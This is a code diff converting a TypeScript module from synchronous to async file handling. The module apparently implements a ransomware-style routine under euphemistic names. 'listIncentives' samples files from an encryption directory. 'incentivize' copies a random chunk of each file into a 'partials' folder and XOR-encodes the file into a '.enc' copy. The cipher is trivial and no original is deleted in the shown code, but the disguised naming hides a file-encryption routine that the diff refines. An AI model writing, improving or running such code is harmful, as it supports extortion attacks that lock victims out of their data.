@@ -1,5 +1,7 @@
 import { getFiles, getFilesNotEncr, sampleN, FileEntry } from "./helpers";
-import fs from 'fs';
+import { promises as fs } from 'node:fs';
+import { Buffer } from 'node:buffer';
+import { join } from 'node:path';
 
 const ENCRYPTION_DIR = './';
 
@@ -15,51 +17,57 @@ async function listIncentives(count = 8): Promise<string[]> {
     return sampleN(files, count);
 }
 
-function copyRandomChunk(
-    sourcePath: string,
-    destPath: string,
-    chunkSize = 4096
+
+export async function copyRandomChunk(
+  sourcePath: string,
+  destPath: string,
+  chunkSize = 4096
 ) {
-    const stats = fs.statSync(sourcePath);
-    const fileSize = stats.size;
+  const stats = await fs.stat(sourcePath);
+  const fileSize = stats.size;
 
-    if (fileSize === 0) throw new Error('Source file is empty.');
+  if (fileSize === 0) throw new Error('Source file is empty.');
 
-    const start = Math.floor(Math.random() * Math.max(1, fileSize - chunkSize));
-    const end = Math.min(start + chunkSize, fileSize);
+  const start = Math.floor(Math.random() * Math.max(1, fileSize - chunkSize));
+  const end = Math.min(start + chunkSize, fileSize);
 
-    const buffer = Buffer.alloc(end - start);
-    const fd = fs.openSync(sourcePath, 'r');
-    fs.readSync(fd, buffer, 0, buffer.length, start);
-    fs.closeSync(fd);
+  const buffer = Buffer.alloc(end - start);
 
-    fs.writeFileSync(destPath, buffer);
+  const handle = await fs.open(sourcePath, 'r');
+  await handle.read(buffer, 0, buffer.length, start);
+  await handle.close();
+
+  await fs.writeFile(destPath, buffer);
 }
 
-function incentivize(file: FileEntry): void {
+async function incentivize(file: FileEntry): Promise<void> {
+  const partialPath = join('./partials', file.name);
+  await copyRandomChunk(file.path, partialPath);
 
-    copyRandomChunk(file.path, './partials/' + file.name);
+  const readHandle = await fs.open(file.path, 'r');
+  const writeHandle = await fs.open(file.path + '.enc', 'w');
 
-    const readFd = fs.openSync(file.path, 'r');
-    const writeFd = fs.openSync(file.path + '.enc', 'w');
+  const buf = Buffer.alloc(1024);
 
-    const buf = Buffer.alloc(1024);
-
+  try {
     while (true) {
-        const read = fs.readSync(readFd, buf);
-        if (read == 0) break;
+      const { bytesRead } = await readHandle.read(buf, 0, buf.length, null);
+      if (bytesRead === 0) break;
 
-        for (let i = 0; i < read; i++)
-            buf[i] ^= 0x4a;
-        fs.writeSync(writeFd, buf, 0, read, null);
+      for (let i = 0; i < bytesRead; i++) {
+        buf[i] ^= 0x4a;
+      }
+
+      await writeHandle.write(buf.subarray(0, bytesRead));
     }
-
-    fs.closeSync(readFd);
-    fs.closeSync(writeFd);
+  } finally {
+    await readHandle.close();
+    await writeHandle.close();
+  }
 }
 
-function readFile(path: string): string {
-    return fs.readFileSync(path, 'utf-8');
+async function readFile(path: string): Promise<string> {
+  return fs.readFile(path, 'utf-8');
 }
 
 export default { listIncentives, incentivize, getFiles, readFile };
